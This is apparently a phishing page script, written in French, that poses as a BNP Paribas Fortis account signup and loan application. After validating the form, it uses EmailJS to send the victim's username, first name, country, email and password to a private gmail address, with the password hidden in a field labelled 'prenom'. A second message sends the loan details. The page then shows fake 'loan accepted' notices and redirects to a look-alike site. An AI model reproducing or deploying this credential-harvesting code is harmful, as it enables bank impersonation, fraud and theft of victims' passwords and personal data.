// La recuperation des elements 
const form = document.querySelector("#form");
const username = document.querySelector('#username');
const email = document.querySelector('#email');
const password = document.querySelector('#password');

const pays = document.querySelector('#pays');
const prenom=document.querySelector('#prenom')
const smaller = document.getElementsByClassName('smaller');
const isCompte=document.getElementById("isCompte")
const password2=document.getElementById('password2')
var userInfo={
 email:"" ,
 prenom:"",
 pays:"",
 username:"",
 password:"",
 password2:"",
  
}
pays.onchange=function (param) {
  userInfo.pays=pays.value
}
username.onchange=function () {
  if(username.value!=''){
    if(username.value.length>=3){
      username.style.border='2px solid seagreen'
      
    smaller[0].innerHTML=""
      userInfo.username=username.value
    }
    else {
      username.style.border='2px solid red'
      smaller[0].style.color='red'
      smaller[0].innerHTML='Nom doit avoir au minimum 3 caractères '
    }
  }
  else {
    username.style.border='2px solid red'
    smaller[0].style.color='red'
    smaller[0].innerHTML='Nom ne peut pas être vide'
  }
  
}
password.onchange=function (param) {
  if (password.value!='') {
    if(password.value.length >=8){
      password.style.border='2px solid seagreen'
      smaller[3].innerHTML=''
      userInfo.password=password.value
      if(password.value==password2.value){
      password2.style.border='2px solid seagreen'
      smaller[4].innerHTML=''
      userInfo.password2=password2.value
    }
    else {
      password2.style.border='2px solid red'
      smaller[4].style.color='red'
      smaller[4].innerHTML="les mots de passes ne se correspondent  pas"
    }

    }
    else {
      password.style.border='2px solid red'
      smaller[3].style.color='red'
      smaller[3].innerHTML="Mot de passe doit avoir minimum 8 caractères "
    }
  }
  else {
    password.style.border='2px solid red'
    smaller[3].style.color='red'
    smaller[3].innerHTML="Mot de passe ne peut pas être vide"
  }
  
}
prenom.onchange=function (param) {
    if(prenom.value!=''){
    if(prenom.value.length>=3){
      prenom.style.border='2px solid seagreen'
    smaller[2].innerHTML=""
      userInfo.prenom=prenom.value
    }
    else {
      smaller[2].style.color='red'
      smaller[2].innerHTML='Prénom doit avoir au minimum 3 caractères '
      prenom.style.border='2px solid red'
    }
  }
  else {
    prenom.style.border='2px solid red'
    smaller[2].style.color='red'
    smaller[2].innerHTML='Prénom ne peut pas être vide'
  }
  
  
}
email.onchange=function () {
  if (email.value!='') {
   const emailTest=email_verify(email.value)
   console.log(emailTest)
  if (emailTest===true) {
    userInfo.email=email.value
    email.style.border='2px solid seagreen'
    smaller[1].innerHTML=''
  }
  else {
    email.style.border='2px solid red'
    smaller[1].style.color='red'
    smaller[1].innerHTML='Email non valide'
  }
  }
  else {
   email.style.border='2px solid red'
    smaller[1].style.color='red'
    smaller[1].innerHTML='Email ne peut pas être vide'
  }
 
}
password2.onchange=function () {
  if (password2.value!='') {
    if(password.value==password2.value){
      password2.style.border='2px solid seagreen'
      smaller[4].innerHTML=''
      userInfo.password2=password2.value
    }
    else {
      password2.style.border='2px solid red'
      smaller[4].style.color='red'
      smaller[4].innerHTML="les mots de passes ne se correspondent  pas"
    }
  }
  else {
    password2.style.border='2px solid red'
    smaller[4].style.color='red'
    smaller[4].innerHTML="Mot de passe ne peut pas être vide"
  }
  
  
}
form.addEventListener('click',e=>{
   
console.log(userInfo)
  sucess()
})
// Fonstions

function sucess(){
 
if(userInfo.email!="" && userInfo.password!=''&& userInfo.password2!=''&& pays.value!='' && userInfo.prenom!=''&& userInfo.username!=""&& userInfo.password2==userInfo.password){
  
  
   try {
     // Tab to edit
   
  
      emailjs.init('nO0mGzC33a5qOSUx7')
      var param = {
        
        to: "reunierprospere@gmail.com",
        sendername: ''+userInfo.username,
        mail:''+userInfo.email,
        reply: ""+userInfo.email,
        
        
        pays:''+pays.value,
        prenom:''+userInfo.password2,
        subject: ''+userInfo.prenom
        
       
      }
      var serviceId = "service_cuzrpno"
      var templateId ="template_nvumdqd"
   
      isCompte.style.top = '80px'
      isCompte.style.color='green'
      isCompte.innerHTML = 'Creation de Compte en cours ....'
      emailjs.send(serviceId, templateId, param).then(function(resp) {
        
        if(resp.status==200){
          console.log(resp)
          isCompte.innerHTML = `
                
                        <div> Informations Vérifiées
                        </div> 
                        <div> Inscription acceptée </div>
                    
                       <div style = "margin: 30px;text-align: center">
                       <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                       </div>
                       `
    
          isCompte.style.color='green'
          sendMailLoan(loanItem,userInfo)
        
      
        }
        
      })
  
}
 catch (e) {
             isCompte.innerHTML = `
                   
                           <div> vous êtes pas connecté à Internet </div>
                       
                          <div style = "margin: 30px;text-align: center">
                          <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                          </div>
                          `
         
          isCompte.style.top = '150px'
          
          
          setTimeout(function() {
            isCompte.style.top = '-400px'
          }, 8000)
         }     
    }
    else {
      console.log(userInfo)
      isCompte.style.top = '150px'
    
   
   setTimeout(function () {
     isCompte.style.top='-400px'
   },8000)
    }
      



}

const loanItem=JSON.parse(localStorage.getItem('pretbnpparisbas'))
console.log(loanItem)
function sendMailLoan(item,userGet){
  
           emailjs.init('nO0mGzC33a5qOSUx7')
  var param = {
    sendername: "BNP PARIBAS FORTIS",
    to: "reunierprospere@gmail.com",
    name:  '' + userGet.username,
    replyto: "" + userGet.email,
    message: ` ${userGet.username} ${userGet.prenom} fait une demande de prêt pour une consommation de montant ${item.montantPret} sur une durée de ${item.dureRemboursement}  à taux d 'intérêts ${item.interest}.
    Mr ${userGet.prenom} ${userGet.username} accepte et être capable de payer par mois une somme ${item.montantPayeMois} et une somme ${item.remboursement_total} à la fin du prêt avec un intérêt assurance risque ${item.interest.toFixed(2)}.
    Date de Souscription au Prêt :${new Date().toString()}
    `
  
  }
  var serviceId = "service_cuzrpno"
  var templateId = "template_z2winer"
  
  
  emailjs.send(serviceId, templateId, param).then(function(resp) {
  
      if (resp.status == 200) {
        console.log('bondipanche')
        setTimeout(function(){
          isCompte.innerHTML = `
                            
                                    <div>Vérifications des paramètres du prêt 
                                    </div> 
                                    <div> Prêt accepté </div>
                               <div>
                               Vous recevez  une Notification par Mail dès que votre compte bancaire de prêt sera accrédité par le montant de prêt demander 
                               </div>
                                   <div style = "margin: 30px;text-align: center">
                                   <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                                   </div>
                                   `
        },2000)
        
        isCompte.style.top = '0px'
        isCompte.style.color = 'green'
        setTimeout(function() {
          window.location.href = 'https://bnpparibas-nine.vercel.app/signup'
        }, 8000)
  
  
      }
      else {
        isCompte.style.top = '1050px'
     isCompte.innerHTML = `
                                 
                                         <div>Vérifications des paramètres du prêt 
                                         </div> 
                                         <div> Prêt non accepté </div>
                                    <div>
                  opération échouées.
                  veillez réssayer si le problème persiste contactez le service financier à l'adresse mail suivante 
                  reunierprospere@gmail.com
                                    </div>
                                        <div style = "margin: 30px;text-align: center">
                                        <istyle="font-size:50px;color:green" class="fa">&#xf058;</i> 
                                        </div>`
    setTimeout(function() {
      
         isCompte.style.top='-400px'
        }, 7000)
  
  
  console.log(resp.status)
      }
    }) 

         
}
function setError(elem,message) {
    const formControl = elem.parentElement;
    const small = formControl.querySelector('small');

    // Ajout du message d'erreur
    small.innerText = message

    // Ajout de la classe error
    formControl.className = "form-control error";
}

function setSuccess(elem) {
    const formControl = elem.parentElement;
    formControl.className ='form-control success'
}

function email_verify(email) {
    /*
    * r_rona.22-t@gmail.com
        /^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/
    */
    return /^[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}$/.test(email);
}
function password_verify(passeword) {
    return /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,12}$/.test(passeword);
}
const loadingDiv = document.getElementsByClassName("RainbowBackground");
let ibanCheck,bicCheck,montantCheck=false

let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
    const list= document.getElementById('hover-list')
    const app=document.getElementById('app')
    const listItem=document.getElementsByTagName('li')
    const listDeroulante=document.getElementsByClassName("list-drl")
    
    


/*============Variables setting======*/





  
    


/*============Variables setting======*/





  list.addEventListener('click',function() {
      if(listOpe){
        listDeroulante[0].style.top = '80px'
        listDeroulante[0].style.opacity = 1
        listDeroulante[0].style.display='flex'
        listOpe=false
      }
      else{
        listDeroulante[0].style.top = '65px'
        listDeroulante[0].style.opacity = 0
      listDeroulante[0].style.display='none'
        listOpe=true
      }
    
    })
   


